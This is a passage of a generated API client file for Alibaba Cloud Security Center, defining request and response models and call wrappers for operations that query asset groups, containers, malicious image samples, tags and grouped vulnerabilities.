  groupFather?: int32(name='GroupFather', description='The parent node of the group.', example='958****'),
  groupFlag?: int32(name='GroupFlag', description='The type of the server group. Valid values:

*   **0**: the default group
*   **1**: other groups', example='0'),
  groupId?: long(name='GroupId', description='The ID of the server group.', example='958****'),
  groupIndex?: int32(name='GroupIndex', description='The sequence number.', example='1'),
  groupLevel?: int32(name='GroupLevel', description='The level of the application group.', example='2'),
  groupName?: string(name='GroupName', description='The name of the server group.', example='TestGroupName'),
  groups?: [ string ](name='Groups', description='An array that consists of child groups.'),
  machineNum?: int32(name='MachineNum', description='The number of servers in the group.', example='30'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='9FBC6E47-7508-58C9-9E76-528E118C****'),
}

model DescribeGroupStructResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribeGroupStructResponseBody(name='body'),
}

/**
 * @summary Queries the structure of a group.
 *
 * @param request DescribeGroupStructRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribeGroupStructResponse
 */
async function describeGroupStructWithOptions(request: DescribeGroupStructRequest, runtime: Util.RuntimeOptions): DescribeGroupStructResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeGroupStruct',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the structure of a group.
 *
 * @param request DescribeGroupStructRequest
 * @return DescribeGroupStructResponse
 */
async function describeGroupStruct(request: DescribeGroupStructRequest): DescribeGroupStructResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeGroupStructWithOptions(request, runtime);
}

model DescribeGroupedContainerInstancesRequest {
  criteria?: string(name='Criteria', description='The search conditions for assets. Specify the value in the JSON format. Separate multiple search conditions with commas (,). Example: `[{"name":"riskStatus","value":"YES"},{"name":"riskLevel","value":"2"}]`.

>  Supported search conditions include the instance ID, instance name, virtual private cloud (VPC) ID, region, and public IP address. You can call the [DescribeCriteria](~~DescribeCriteria~~) operation to query the supported search conditions.', example='[{"name":"riskStatus","value":"YES"},{"name":"riskLevel","value":"2"}]'),
  currentPage?: int32(name='CurrentPage', description='The number of the page to return. Default value: **1**.', example='1'),
  fieldValue?: string(name='FieldValue', description='The keyword that you want to use to query containers. This parameter depends on the value of the GroupField parameter.

*   If the **GroupField** parameter is set to **pod**, set this parameter to the name of the pod that you want to query.
*   If the **GroupField** parameter is set to **appName**, set this parameter to the name of the application that you want to query.
*   If the **GroupField** parameter is set to **namespace**, set this parameter to the namespace that you want to query.
*   If the **GroupField** parameter is set to **clusterId**, set this parameter to the ID of the cluster that you want to query.
*   If the **GroupField** parameter is set to **image**, set this parameter to the name of the image that you want to query.

>  Fuzzy match is supported.', example='cas-adad-qeqwe'),
  groupField?: string(name='GroupField', description='The group type that you want to use to query containers. Valid values:

*   **pod**
*   **appName**
*   **namespace**
*   **clusterId**
*   **image**

This parameter is required.', example='pod'),
  logicalExp?: string(name='LogicalExp', description='The logical relationship that you want to use to evaluate multiple search conditions. Valid values:

*   **OR**: Search conditions are evaluated by using a logical **OR**.
*   **AND**: Search conditions are evaluated by using a logical **AND**.', example='OR'),
  pageSize?: int32(name='PageSize', description='The number of entries to return on each page. Default value: **20**.

>  We recommend that you do not leave this parameter empty.', example='20'),
}

model DescribeGroupedContainerInstancesResponseBody = {
  groupedContainerInstanceList?: [ 
    {
      alarmCount?: int32(name='AlarmCount', description='The number of alerts that are detected for the current pod, application, namespace, or cluster.', example='1'),
      appName?: string(name='AppName', description='The name of the application.', example='oss-liveness-probe'),
      clusterId?: string(name='ClusterId', description='The ID of the cluster.', example='cf3824769c85441b4bf3****'),
      clusterName?: string(name='ClusterName', description='The name of the cluster.', example='test'),
      clusterType?: string(name='ClusterType', description='The type of the cluster. Valid values:

*   **Kubernetes**: dedicated Kubernetes cluster.
*   **ManagedKubernetes**: standard managed cluster (edge cluster).
*   **Ask**: serverless Kubernetes (ASK) cluster.', example='ManagedKubernetes'),
      createTime?: long(name='CreateTime', description='The timestamp when the cluster was created. Unit: milliseconds.', example='1600076893000'),
      custerState?: string(name='CusterState', description='The status of the cluster. Valid values:

*   **running**: The cluster is running.
*   **stopped**: The cluster is stopped.
*   **deleted**: The cluster is deleted.
*   **delete_failed**: The cluster failed to be deleted.
*   **failed**: The cluster failed to be created.', example='running'),
      hcCount?: int32(name='HcCount', description='The number of baseline risks that are detected for the current pod, application, namespace, or cluster.', example='20'),
      hostIp?: string(name='HostIp', description='The IP address of the host in the container cluster.', example='172.114.XX.XX'),
      image?: string(name='Image', description='The container image.', example='registry-vpc.ap-southeast-5.aliyuncs.com/log-service-release/sls-connector:1.1.77'),
      imageDigest?: string(name='ImageDigest', description='The digest value of the image.', example='58e58c013f70bbfde140c8a55c1078074b3483479428d4069aa946827fd566cf'),
      imageRepoName?: string(name='ImageRepoName', description='The name of the image repository.', example='test-003'),
      imageRepoNamespace?: string(name='ImageRepoNamespace', description='The namespace of the image repository.', example='name001'),
      imageRepoTag?: string(name='ImageRepoTag', description='The tag that is added to the image repository.', example='dev-20220512-2'),
      imageUuid?: string(name='ImageUuid', description='The UUID of the image.', example='e4bdec1d9ba7e0967111a7ea467c****'),
      instanceCount?: int32(name='InstanceCount', description='The number of pods, applications, clusters, or namespaces.', example='9'),
      instanceId?: string(name='InstanceId', description='The ID of the server.', example='i-8vb9ul5xec4tua4q****'),
      namespace?: string(name='Namespace', description='The namespace of the cluster.', example='kube-system'),
      pod?: string(name='Pod', description='The name of the pod.', example='csi-plugin-2n****'),
      podIp?: string(name='PodIp', description='The IP address of the pod.', example='172.114.XX.XX'),
      regionId?: string(name='RegionId', description='The region ID of the instance.', example='cn-hangzhou'),
      riskInstanceCount?: int32(name='RiskInstanceCount', description='The number of at-risk instances.', example='1'),
      riskLevel?: string(name='RiskLevel', description='The risk level. Valid values:

*   **high**
*   **medium**
*   **low**', example='low'),
      riskStatus?: string(name='RiskStatus', description='Indicates whether risks were detected. Valid values:

*   **NO**
*   **YES**', example='NO'),
      syncOpen?: int32(name='SyncOpen', description='Indicates whether the synchronization of cluster audit logs is enabled. Valid values:

*   **0**: disabled.
*   **1**: enabled.', example='1'),
      syncStatus?: int32(name='SyncStatus', description='The status of the synchronization of cluster audit logs. Valid values:

*   **0**: The synchronization failed.
*   **1**: The synchronization is successful.', example='1'),
      vulCount?: int32(name='VulCount', description='The number of vulnerabilities that are detected for the current pod, application, namespace, or cluster.', example='1'),
    }
  ](name='GroupedContainerInstanceList', description='The information about the container.'),
  pageInfo?: {
    count?: int32(name='Count', description='The number of container assets returned on the current page.', example='20'),
    currentPage?: int32(name='CurrentPage', description='The page number of the returned page.', example='1'),
    pageSize?: int32(name='PageSize', description='The number of entries returned per page. Default value: **20**.', example='20'),
    totalCount?: int32(name='TotalCount', description='The total number of container assets returned.', example='25'),
  }(name='PageInfo', description='The pagination information.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='4E5BFDCF-B9DD-430D-9DA4-151BCB581C9D'),
}

model DescribeGroupedContainerInstancesResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribeGroupedContainerInstancesResponseBody(name='body'),
}

/**
 * @summary Queries containers by group type.
 *
 * @param request DescribeGroupedContainerInstancesRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribeGroupedContainerInstancesResponse
 */
async function describeGroupedContainerInstancesWithOptions(request: DescribeGroupedContainerInstancesRequest, runtime: Util.RuntimeOptions): DescribeGroupedContainerInstancesResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.criteria)) {
    query['Criteria'] = request.criteria;
  }
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.fieldValue)) {
    query['FieldValue'] = request.fieldValue;
  }
  if (!Util.isUnset(request.groupField)) {
    query['GroupField'] = request.groupField;
  }
  if (!Util.isUnset(request.logicalExp)) {
    query['LogicalExp'] = request.logicalExp;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeGroupedContainerInstances',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries containers by group type.
 *
 * @param request DescribeGroupedContainerInstancesRequest
 * @return DescribeGroupedContainerInstancesResponse
 */
async function describeGroupedContainerInstances(request: DescribeGroupedContainerInstancesRequest): DescribeGroupedContainerInstancesResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeGroupedContainerInstancesWithOptions(request, runtime);
}

model DescribeGroupedInstancesRequest {
  currentPage?: int32(name='CurrentPage', description='The number of the page to return. Default value: **1**.', example='1'),
  fieldValue?: string(name='FieldValue', description='The name of the group to which the assets belong. Fuzzy search is supported.', example='test-01'),
  groupField?: string(name='GroupField', description='The filter condition that you want to use to query the assets. Valid values:

*   **groupId**: the group to which the assets belong
*   **regionId**: the region in which the assets reside
*   **vpcInstanceId**: the virtual private cloud (VPC) in which the assets reside

This parameter is required.', example='groupId'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
  machineTypes?: string(name='MachineTypes', description='The type of the assets that you want to query. Set the value to **ecs**, which indicates Elastic Compute Service (ECS) instances.', example='ecs'),
  noPage?: boolean(name='NoPage', description='Specifies whether to enable paged query. Default value: **true**. Valid values:

*   **true**: yes
*   **false**: no', example='true'),
  pageSize?: int32(name='PageSize', description='The number of entries to return on each page. Default value: **20**.', example='20'),
  saleVersionCheckCode?: string(name='SaleVersionCheckCode', description='The edition of Security Center that protects the asset. Valid values:

* **sas_gte_advanced**: the Advanced edition or higher
* **sas_gte_enterprise**: the Enterprise edition or higher
* **sas_gt_basic:** a paid edition
* **sas_eq_advanced:** the Advanced edition
* **sas_gt_anti_virus:** an edition higher than the Anti-virus edition', example='sas_gt_basic'),
  vendor?: int32(name='Vendor', description='The source of the server. Valid values:

*   **0**: an asset provided by Alibaba Cloud.
*   **1**: a third-party cloud server
*   **2**: a server in a data center
*   **3**, **4**, **5**, and **7**: other cloud asset
*   **8**: a lightweight asset', example='0'),
  vendors?: string(name='Vendors', description='The source of the server. Separate multiple sources with commas (,).Valid values:

*   **0**: an asset provided by Alibaba Cloud.
*   **1**: a third-party cloud server
*   **2**: a server in a data center
*   **3**, **4**, **5**, and **7**: other cloud asset
*   **8**: a lightweight asset', example='0,8'),
}

model DescribeGroupedInstancesResponseBody = {
  instances?: [ 
    {
      asapVulInstanceCount?: long(name='AsapVulInstanceCount', description='The number of assets on which high-risk vulnerabilities are detected.', example='11'),
      authVersionCheckCount?: int32(name='AuthVersionCheckCount', description='The number of assets that are protected by the specified edition.', example='205'),
      fieldAliasName?: string(name='FieldAliasName', description='The name of the server group.', example='testA'),
      groupFlag?: int32(name='GroupFlag', description='The type of the server group. Valid values:

*   **0**: the default group
*   **1**: other group', example='1'),
      instanceCoreCount?: long(name='InstanceCoreCount', description='The number of cores of assets in the specified asset type.

>  If the **MachineTypes** request parameter is not specified, the value of the InstanceCoreCount parameter indicates the total number of cores of assets within your account.', example='610'),
      instanceCount?: string(name='InstanceCount', description='The total number of assets that belong to the specified type.

>  If the **MachineTypes** request parameter is not specified, the value of the InstanceCount parameter is the total number of your assets.', example='205'),
      os?: string(name='Os', description='The operating system type of the asset. Valid values:

* **windows**
* **linux**

> This parameter is returned only when Lang is set to zh.', example='windows'),
      riskInstanceCount?: string(name='RiskInstanceCount', description='The number of assets that are at risk.', example='172'),
      unProtectedInstanceCount?: string(name='UnProtectedInstanceCount', description='The number of assets that are not protected by Security Center.', example='32'),
    }
  ](name='Instances', description='The information about the assets.'),
  pageInfo?: {
    count?: int32(name='Count', description='The number of entries returned on the current page.', example='20'),
    currentPage?: int32(name='CurrentPage', description='The page number of the returned page.', example='5'),
    pageSize?: int32(name='PageSize', description='The number of entries returned per page. Default value: **20**.', example='20'),
    totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='100'),
  }(name='PageInfo', description='The pagination information.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='52A3AEE6-114A-499D-8990-4BA9B27FE0AA'),
}

model DescribeGroupedInstancesResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribeGroupedInstancesResponseBody(name='body'),
}

/**
 * @summary Queries the statistical information about assets based on a specified filter condition.
 *
 * @param request DescribeGroupedInstancesRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribeGroupedInstancesResponse
 */
async function describeGroupedInstancesWithOptions(request: DescribeGroupedInstancesRequest, runtime: Util.RuntimeOptions): DescribeGroupedInstancesResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.fieldValue)) {
    query['FieldValue'] = request.fieldValue;
  }
  if (!Util.isUnset(request.groupField)) {
    query['GroupField'] = request.groupField;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.machineTypes)) {
    query['MachineTypes'] = request.machineTypes;
  }
  if (!Util.isUnset(request.noPage)) {
    query['NoPage'] = request.noPage;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.saleVersionCheckCode)) {
    query['SaleVersionCheckCode'] = request.saleVersionCheckCode;
  }
  if (!Util.isUnset(request.vendor)) {
    query['Vendor'] = request.vendor;
  }
  if (!Util.isUnset(request.vendors)) {
    query['Vendors'] = request.vendors;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeGroupedInstances',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the statistical information about assets based on a specified filter condition.
 *
 * @param request DescribeGroupedInstancesRequest
 * @return DescribeGroupedInstancesResponse
 */
async function describeGroupedInstances(request: DescribeGroupedInstancesRequest): DescribeGroupedInstancesResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeGroupedInstancesWithOptions(request, runtime);
}

model DescribeGroupedMaliciousFilesRequest {
  clusterId?: string(name='ClusterId', description='The cluster ID of the container on which the malicious image sample is detected.', example='c556c8133b5ad4378b7fc533ddbda****'),
  currentPage?: int32(name='CurrentPage', description='The number of the page to return. Pages start from page **1**. Default value: **1**.

This parameter is required.', example='1'),
  fuzzyMaliciousName?: string(name='FuzzyMaliciousName', description='The name of the malicious image sample that you want to query.

>  Fuzzy match is supported.', example='Mining'),
  imageDigest?: string(name='ImageDigest', description='The image digest.', example='6a5e103187b31a94592a47a5858617f7****'),
  imageLayer?: string(name='ImageLayer', description='The image layer.', example='27213ad375b53628dd152a5ca****'),
  imageTag?: string(name='ImageTag', description='The image tag.', example='0.2'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
  levels?: string(name='Levels', description='The severity of the malicious image sample that you want to query. You can enter multiple severities. Separate the severities with commas (,). Valid values:

*   **serious**
*   **suspicious**
*   **remind**', example='serious'),
  maliciousMd5?: string(name='MaliciousMd5', description='The MD5 hash value of the malicious image sample.', example='d836968041f7683b5459****'),
  pageSize?: string(name='PageSize', description='The number of entries to return on each page. Default value: **20**.

This parameter is required.', example='20'),
  repoId?: string(name='RepoId', description='The ID of the image repository.

>  You can call the [ListRepository](https://help.aliyun.com/document_detail/145293.html) operation to query the IDs of image repositories from the value of the **RepoId** response parameter.', example='crr-vridcl4****'),
  repoInstanceId?: string(name='RepoInstanceId', description='The ID of the container image.

>  You can call the [ListRepository](https://help.aliyun.com/document_detail/145293.html) operation to query the IDs of container images from the value of the **InstanceId** response parameter.', example='cri-datvailb****'),
  repoName?: string(name='RepoName', description='The name of the image repository.

>  Fuzzy match is supported.', example='centos'),
  repoNamespace?: string(name='RepoNamespace', description='The namespace to which the image repository belongs.

>  Fuzzy match is supported.', example='hanghai-namespace'),
  repoRegionId?: string(name='RepoRegionId', description='The region ID of the image repository. Valid values:

*   **cn-beijing**: China (Beijing)
*   **cn-zhangjiakou**: China (Zhangjiakou)
*   **cn-hangzhou**: China (Hangzhou)
*   **cn-shanghai**: China (Shanghai)
*   **cn-shenzhen**: China (Shenzhen)
*   **cn-hongkong**: China (Hong Kong)
*   **ap-southeast-1**: Singapore
*   **ap-southeast-5**: Indonesia (Jakarta)
*   **us-east-1**: US (Virginia)
*   **us-west-1**: US (Silicon Valley)
*   **eu-central-1**: Germany (Frankfurt)
*   **eu-west-1**: UK (London)', example='cn-shanghai'),
  scanRange?: [ string ](name='ScanRange', description='The types of the assets that you want to scan.'),
}

model DescribeGroupedMaliciousFilesResponseBody = {
  groupedMaliciousFileResponse?: [ 
    {
      firstScanTimestamp?: long(name='FirstScanTimestamp', description='The timestamp generated when the first scan was performed. Unit: milliseconds.', example='1594907349000'),
      imageCount?: long(name='ImageCount', description='The number of affected images.', example='3'),
      latestScanTimestamp?: long(name='LatestScanTimestamp', description='The timestamp generated when the last scan was performed. Unit: milliseconds.', example='1596533942000'),
      level?: string(name='Level', description='The severity of the malicious image sample. Valid values:

*   **serious**
*   **suspicious**
*   **remind**', example='serious'),
      maliciousKey?: string(name='MaliciousKey', description='The keyword of the malicious image sample.', example='WEBSHELL_IMG'),
      maliciousMd5?: string(name='MaliciousMd5', description='The MD5 hash value of the malicious image sample.', example='d836968041f7683b5459****'),
      maliciousName?: string(name='MaliciousName', description='The name of the malicious image sample.', example='testFile'),
      status?: int32(name='Status', description='The handling status of the malicious image sample. Valid values:

*   **0**: unhandled
*   **1**: handled
*   **2**: verifying
*   **3**: whitelisted', example='0'),
    }
  ](name='GroupedMaliciousFileResponse', description='The details of the malicious image sample.'),
  pageInfo?: {
    count?: int32(name='Count', description='The number of entries returned on the current page.', example='2'),
    currentPage?: int32(name='CurrentPage', description='The page number of the returned page.', example='1'),
    pageSize?: int32(name='PageSize', description='The number of entries returned per page. Default value: **20**.', example='20'),
    totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='2'),
  }(name='PageInfo', description='The pagination information.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='8045E03E-6D91-4C53-9F22-5A1B84BB29D9'),
}

model DescribeGroupedMaliciousFilesResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribeGroupedMaliciousFilesResponseBody(name='body'),
}

/**
 * @summary Queries a list of malicious image samples.
 *
 * @param request DescribeGroupedMaliciousFilesRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribeGroupedMaliciousFilesResponse
 */
async function describeGroupedMaliciousFilesWithOptions(request: DescribeGroupedMaliciousFilesRequest, runtime: Util.RuntimeOptions): DescribeGroupedMaliciousFilesResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.clusterId)) {
    query['ClusterId'] = request.clusterId;
  }
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.fuzzyMaliciousName)) {
    query['FuzzyMaliciousName'] = request.fuzzyMaliciousName;
  }
  if (!Util.isUnset(request.imageDigest)) {
    query['ImageDigest'] = request.imageDigest;
  }
  if (!Util.isUnset(request.imageLayer)) {
    query['ImageLayer'] = request.imageLayer;
  }
  if (!Util.isUnset(request.imageTag)) {
    query['ImageTag'] = request.imageTag;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.levels)) {
    query['Levels'] = request.levels;
  }
  if (!Util.isUnset(request.maliciousMd5)) {
    query['MaliciousMd5'] = request.maliciousMd5;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.repoId)) {
    query['RepoId'] = request.repoId;
  }
  if (!Util.isUnset(request.repoInstanceId)) {
    query['RepoInstanceId'] = request.repoInstanceId;
  }
  if (!Util.isUnset(request.repoName)) {
    query['RepoName'] = request.repoName;
  }
  if (!Util.isUnset(request.repoNamespace)) {
    query['RepoNamespace'] = request.repoNamespace;
  }
  if (!Util.isUnset(request.repoRegionId)) {
    query['RepoRegionId'] = request.repoRegionId;
  }
  if (!Util.isUnset(request.scanRange)) {
    query['ScanRange'] = request.scanRange;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeGroupedMaliciousFiles',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries a list of malicious image samples.
 *
 * @param request DescribeGroupedMaliciousFilesRequest
 * @return DescribeGroupedMaliciousFilesResponse
 */
async function describeGroupedMaliciousFiles(request: DescribeGroupedMaliciousFilesRequest): DescribeGroupedMaliciousFilesResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeGroupedMaliciousFilesWithOptions(request, runtime);
}

model DescribeGroupedTagsRequest {
  machineTypes?: string(name='MachineTypes', description='The type of the asset to query. If you do not specify this parameter, the tags of all asset types are queried. Valid values:

*   **ecs**: server
*   **cloud_product**: Alibaba Cloud service', example='ecs'),
}

model DescribeGroupedTagsResponseBody = {
  count?: int32(name='Count', description='This parameter is deprecated.', example='0'),
  groupedFileds?: [ 
    {
      count?: string(name='Count', description='The number of assets to which the tag is added.', example='152'),
      name?: string(name='Name', description='The name of the tag.', example='InternetIp'),
      tagId?: int32(name='TagId', description='The ID of the tag.', example='3252366'),
    }
  ](name='GroupedFileds', description='An array that consists of the statistics of the asset tags.'),
  httpStatusCode?: int32(name='HttpStatusCode', description='The HTTP status code of the request.', example='200'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='151F6EB6-D5F3-417A-AF7B-4D84975DB586'),
  success?: boolean(name='Success', description='Indicates whether the request is successful. Valid values:

*   **true**: The request is successful.
*   **false**: The request fails.', example='true'),
}

model DescribeGroupedTagsResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribeGroupedTagsResponseBody(name='body'),
}

/**
 * @summary Queries the statistics of asset tags.
 *
 * @param request DescribeGroupedTagsRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribeGroupedTagsResponse
 */
async function describeGroupedTagsWithOptions(request: DescribeGroupedTagsRequest, runtime: Util.RuntimeOptions): DescribeGroupedTagsResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.machineTypes)) {
    query['MachineTypes'] = request.machineTypes;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeGroupedTags',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the statistics of asset tags.
 *
 * @param request DescribeGroupedTagsRequest
 * @return DescribeGroupedTagsResponse
 */
async function describeGroupedTags(request: DescribeGroupedTagsRequest): DescribeGroupedTagsResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeGroupedTagsWithOptions(request, runtime);
}

model DescribeGroupedVulRequest {
  aliasName?: string(name='AliasName', description='The alias of the vulnerability.', example='RHSA-2019:0230-Important: polkit security update'),
  assetType?: string(name='AssetType', description='The type of the asset on which the vulnerability is detected. Separate multiple types with commas (,). Valid values:

*   **ECS**: Elastic Compute Service (ECS) instance
*   **CONTAINER**: container', example='ECS,CONTAINER'),
  attachTypes?: string(name='AttachTypes', description='The type of the vulnerability. This parameter is valid only for application vulnerabilities. Separate multiple values with commas (,). Valid values:

*   **sca**: vulnerability that is detected based on software component analysis
*   **app**: application vulnerability', example='sca'),
  containerFieldName?: string(name='ContainerFieldName', description='The key of the condition that is used to query containers. Valid values:

*   **instanceId**: the ID of the asset
*   **appName**: the name of the application
*   **clusterId**: the ID of the cluster
*   **regionId**: the ID of the region
*   **nodeName**: the name of the node
*   **namespace**: the namespace
*   **clusterName**: the name of the cluster
*   **image**: the name of the image
*   **imageRepoName**: the name of the image repository
*   **imageRepoNamespace**: the namespace to which the image repository belongs
*   **imageRepoTag**: the tag that is added to the image
*   **imageDigest**: the digest of the image', example='appName'),
  currentPage?: int32(name='CurrentPage', description='The number of the page to return. Default value: **1**.', example='1'),
  dealed?: string(name='Dealed', description='Specifies whether the vulnerability is handled. Valid values:

*   **y**: handled
*   **n**: not handled', example='n'),
  groupId?: string(name='GroupId', description='The ID of the asset group.', example='235454'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
  necessity?: string(name='Necessity', description='The priorities to fix the vulnerabilities. Separate multiple priorities with commas (,). Valid values:

*   **asap**: high
*   **later**: medium
*   **nntf**: low', example='asap,later,nntf'),
  pageSize?: int32(name='PageSize', description='The number of entries per page. Default value: 10.', example='20'),
  resourceDirectoryAccountId?: long(name='ResourceDirectoryAccountId', description='The Alibaba Cloud account ID of the member in the resource directory.

>  You can call the [DescribeMonitorAccounts](~~DescribeMonitorAccounts~~) operation to query the account ID.', example='127608589417****'),
  searchTags?: string(name='SearchTags', description='The tag that is used to search for the vulnerability. Valid values:

*   **Restart required**
*   **Remote utilization**
*   **EXP exists**
*   **Available**
*   **Elevation of Privilege**
*   **Code Execution**', example='Code Execution'),
  targetType?: string(name='TargetType', description='The query type for containers. Valid values:

*   **containerId**: the ID of the container
*   **uuid**: the ID of the asset', example='containerId'),
  type?: string(name='Type', description='The type of the vulnerability that you want to query. Default value: cve. Valid values:

*   **cve**: Linux software vulnerability
*   **sys**: Windows system vulnerability
*   **cms**: Web-CMS vulnerability
*   **app**: application vulnerability that is detected by network scanning
*   **sca**: application vulnerability that is detected by software component analysis', example='cve'),
  uuids?: string(name='Uuids', description='The UUID of the server. Separate multiple UUIDs with commas (,).', example='d42f938c-d962-48a0-90f9-05e4ea****'),
}

model DescribeGroupedVulResponseBody = {
  currentPage?: int32(name='CurrentPage', description='The page number.', example='1'),
  groupedVulItems?: [ 
    {
      aliasName?: string(name='AliasName', description='The alias of the vulnerability.', example='RHSA-2017:0184-Important: mysql security update'),
      asapCount?: int32(name='AsapCount', description='The number of vulnerabilities that have the **high** priority.', example='0'),
      gmtFirst?: long(name='GmtFirst', description='The timestamp when the vulnerability was first detected. Unit: milliseconds.', example='1639371046000'),
      gmtLast?: long(name='GmtLast', description='The timestamp when the vulnerability was last detected. Unit: milliseconds.', example='1639371446000'),
      handledCount?: int32(name='HandledCount', description='The number of handled vulnerabilities.', example='0'),
      languageType?: string(name='LanguageType', description='The language type associated with the vulnerability. Valid values:

*   **java**
*   **php**

>  This parameter is valid only for a vulnerability of the sca type.', example='java'),
      laterCount?: int32(name='LaterCount', description='The number of vulnerabilities that have the **medium** priority.', example='0'),
      name?: string(name='Name', description='The name of the vulnerability.', example='oval:com.redhat.rhsa:def:20170184'),
      nntfCount?: int32(name='NntfCount', description='The number of vulnerabilities that have the **low** priority.', example='59'),
      raspDefend?: int32(name='RaspDefend', description='Indicates whether the application protection feature is supported. Valid values:

*   **0**: not supported
*   **1**: supported

>  If this parameter is not returned, the application protection feature is not supported.', example='1'),
      related?: string(name='Related', description='The IDs of the common vulnerabilities and exposures (CVEs) that are related to the vulnerability.', example='CVE-2023-24881,CVE-2023-24898'),
      tags?: string(name='Tags', description='The tag of the vulnerability. Valid values:

*   **Restart required**
*   **Remote utilization**
*   **EXP exists**
*   **Available**
*   **Elevation of Privilege**
*   **Code Execution**', example='Code Execution'),
      totalFixCount?: long(name='TotalFixCount', description='The total number of fixed vulnerabilities.', example='0'),
      type?: string(name='Type', description='The type of the vulnerability. Valid values:

*   **cve**: Linux software vulnerability
*   **sys**: Windows system vulnerability
*   **cms**: Web-CMS vulnerability
*   **app**: application vulnerability
*   **emg**: urgent vulnerability
*   **sca**: vulnerability that is detected by software component analysis', example='cve'),
    }
  ](name='GroupedVulItems', description='The information about the vulnerability.'),
